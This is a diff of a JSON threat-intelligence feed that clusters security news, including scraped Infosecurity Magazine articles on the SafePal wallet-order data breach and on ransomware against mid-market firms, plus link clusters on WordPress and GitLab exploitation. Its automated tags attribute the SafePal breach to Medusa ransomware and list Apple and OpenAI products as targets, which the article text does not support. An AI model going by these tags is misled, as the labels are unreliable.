+        "full_body": "Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 1 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 2 AI is Already Powering Cyber-Attacks. Can it Power Cyber Defense? Opinion 3 July 2026 3 ICO Urges Police to Improve Data Governance in Facial Recognition Rollouts News 19 August 2026 4 NASA Ground Control Software Flaw Enables Unauthenticated Commands News 18 August 2026 5 Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix Ne",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "credential_theft",
+            "data_breach"
+          ],
+          "actor_attribution": [
+            "Medusa"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "government",
+            "critical_infrastructure",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Apple iOS/macOS",
+            "OpenAI/ChatGPT"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Apple iOS/macOS": "target",
+            "OpenAI/ChatGPT": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
+          "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
+          "published": "2026-08-17T09:10:00+00:00",
+          "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "credential_theft",
+              "data_breach"
+            ],
+            "actor_attribution": [
+              "Medusa"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "government",
+              "critical_infrastructure",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Apple iOS/macOS",
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Apple iOS/macOS": "target",
+              "OpenAI/ChatGPT": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "e56a40bc8a",
       "priority_score": 8,
       "member_count": 1,
@@ -7134,231 +7360,6 @@
       ]
     },
     {
-      "cluster_id": "1293349fdc",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Three-quarters of Ransomware Attacks Target Mid-Market Firms",
-        "link": "https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/",
-        "published": "2026-08-18T10:00:00+00:00",
-        "summary": "Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit",
-        "full_body": "Infosecurity Magazine Home » News » Three-quarters of Ransomware Attacks Target Mid-Market Firms Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Nearly three-quarters of ransomware victims since 2023 were mid-sized organizations with $10m to $1bn in revenue, according to a new Black Kite study. The third-party risk specialist analyzed 13,336 disclosed incidents dating back to January 2023, as well as a separate security scan of 120,128 mid-market companies, to compile its new report, Mid-Market Is the Routing Target . Published on August 18, it follows the Dun & Bradstreet revenue-based definition for market size: lower mid-market at $10m-$50m, core mid-market at $50m-$500m and upper mid-market at $500m-$1bn. The report found that 73% of ransomware attacks in North America and Europe hit companies with $10m-$1bn in annual revenue, with the figure barely moving even as the volume of incidents grew by 44% between 2023 and 2025. Read more on ransomware: Verizon DBIR: Small Businesses Bearing the Brunt of Ransomware Attacks Over the reporting period, the largest share of mid-market victims sat in the lower mid-market category (54%). In absolute terms, victim numbers rose here from 1391 in 2024 to 1821 in 2025. The core mid-market accounted for the second-highest number of victims over the period, ranging from 40-45% across the three-and-a-half years. Victim count here rose from 970 to 1474 between 2024 and 2025, while in the upper mid-market category, the numbers dropped from 126 in 2023 to 45 in 2025, a decline of 65%. North America (72%) accounted for many more incidents than Europe (28%), where UK firms were the most popular target. Gaps in Security Posture Manufacturing firms were by far the most popular target for threat actors, accounting for 26% of mid-market ransomware victims, followed by professional, scientific and technical services, and construction sectors. Manufacturing businesses typically have a low tolerance for outages and hold highly sensitive information, making them an attractive target. Data released by industry body Make UK published in August revealed that almost a third of UK manufacturers (30%) experienced a cyber incident over the past year, either directly or through their supply chain. Separate data from ESET published in April found that, of UK manufacturers that suffered a cyber incident last year, almost all (95%) admit the attack had a direct impact on their business, and most (53%) suffered financial loss as a result. Supply chain disruption (44%) and missed customer or supplier commitments (39%) were also commonplace. Black Kite’s analysis of security posture across over 120,000 mid-market firms revealed some of the deficiencies which could lead to ransomware compromise. Its findings include: Over a quarter (28%) had at least one known exploited vulnerability (KEV) Over half (55%) had at least one significant patch management finding on public-facing software Nearly half (48%) carried at least one disclosed vulnerability with a CVSS score of 8.0 or higher Nearly a third (32%) had at least one stealer log finding Nearly half (47%) had missing or insufficient DMARC protection The challenge for security teams in these organizations is set to increase as AI adoption grows, Black Kite argued. “AI is accelerating how fast new vulnerabilities are discovered, and the volume is climbing toward levels no small team can triage by hand,” the report claimed. “Only a fraction of those vulnerabilities are ever exploited, but finding that fraction across a company’s own systems and its suppliers is exactly the work a mid-market team has little capacity to do.” You may also like 80% of Manufacturing Firms Have Critical Vulnerabilities News 2 October 2024 Manufacturers Struggle to Manage Cyber-Threats from New Tech Deployments News 5 December 2022 Tech Manufacturer Data I/O H",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Three-quarters of Ransomware Attacks Target Mid-Market Firms",
-          "link": "https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/",
-          "published": "2026-08-18T10:00:00+00:00",
-          "summary": "Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "20c2a82904",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft",
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [
-          "Medusa"
-        ],
-        "affected_industries": [
-          "critical_infrastructure",
-          "financial_services",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "OpenAI/ChatGPT"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
-        "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-        "published": "2026-08-17T09:10:00+00:00",
-        "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
-        "full_body": "Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 1 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 2 AI is Already Powering Cyber-Attacks. Can it Power Cyber Defense? Opinion 3 July 2026 3 ICO Urges Police to Improve Data Governance in Facial Recognition Rollouts News 19 August 2026 4 NASA Ground Control Software Flaw Enables Unauthenticated Commands News 18 August 2026 5 Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix Ne",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "credential_theft",
-            "data_breach"
-          ],
-          "actor_attribution": [
-            "Medusa"
-          ],
-          "affected_industries": [
-            "financial_services",
-            "government",
-            "critical_infrastructure",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "Apple iOS/macOS",
-            "OpenAI/ChatGPT"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Apple iOS/macOS": "target",
-            "OpenAI/ChatGPT": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
-          "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-          "published": "2026-08-17T09:10:00+00:00",
-          "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "credential_theft",
-              "data_breach"
-            ],
-            "actor_attribution": [
-              "Medusa"
-            ],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "critical_infrastructure",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "Apple iOS/macOS",
-              "OpenAI/ChatGPT"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Apple iOS/macOS": "target",
-              "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "2faaf824a1",
       "priority_score": 8,
       "member_count": 1,
@@ -7581,8 +7582,8 @@
         "2d052ce523",
         "114ded0230",
         "3ec665ac60",
-        "388705e7c7",
-        "20c2a82904"
+        "20c2a82904",
+        "388705e7c7"
       ],
       "links": [
         "https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html",
@@ -7597,8 +7598,56 @@
         "https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/",
         "https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands",
         "https://www.sophos.com/en-us/blog/2608-patch-tuesday",
-        "https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html",
-        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/"
+        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
+        "https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html"
+      ]
+    },
+    {
+      "label": "active exploitation targeting WordPress",
+      "anchor_signal": "WordPress",
+      "theme_key": "wordpress",
+      "dominant_features": {
+        "threat_categories": [
+          "active_exploitation"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "WordPress",
+          "Citrix",
+          "GitLab"
+        ],
+        "urgency_signals": [
+          "preauth_unauth"
+        ]
+      },
+      "cluster_count": 5,
+      "article_count": 12,
+      "cohesion": 0.209,
+      "shared_strong_signals": [
+        "WordPress"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "a7b2f82e67",
+        "ad3b948659",
+        "8a66834bf6",
+        "94883eb56c",
+        "6924c12056"
+      ],
+      "links": [
+        "https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html",
+        "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles",
+        "https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/",
+        "https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/",
+        "https://www.exploit-db.com/exploits/52642",
+        "https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/",
+        "https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/",
+        "https://www.securityweek.com/critical-gitlab-flaw-exploited-shortly-after-disclosure/",
+        "https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html",
+        "https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges"
       ]
     },
     {
@@ -7642,52 +7691,6 @@
         "https://www.reddit.com/r/netsec/comments/1vo06aj/youre_back_in_the_room_citrix_netscaler_preauth/",
         "https://www.securityweek.com/exploitation-expected-for-critical-authentication-bypass-patched-in-citrix-netscaler/",
         "https://www.securityweek.com/mlflow-vulnerability-exploited-for-cloud-credential-theft/",
-        "https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/",
-        "https://www.securityweek.com/critical-gitlab-flaw-exploited-shortly-after-disclosure/",
-        "https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html",
-        "https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges"
-      ]
-    },
-    {
-      "label": "active exploitation targeting WordPress",
-      "anchor_signal": "WordPress",
-      "theme_key": "wordpress",
-      "dominant_features": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "WordPress",
-          "Citrix",
-          "GitLab"
-        ],
-        "urgency_signals": [
-          "preauth_unauth"
-        ]
-      },
-      "cluster_count": 4,
-      "article_count": 11,
-      "cohesion": 0.219,
-      "shared_strong_signals": [
-        "WordPress"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "a7b2f82e67",
-        "8a66834bf6",
-        "94883eb56c",
-        "6924c12056"
-      ],
-      "links": [
-        "https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html",
-        "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles",
-        "https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/",
-        "https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/",
-        "https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/",
         "https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/",
         "https://www.securityweek.com/critical-gitlab-flaw-exploited-shortly-after-disclosure/",
         "https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html",
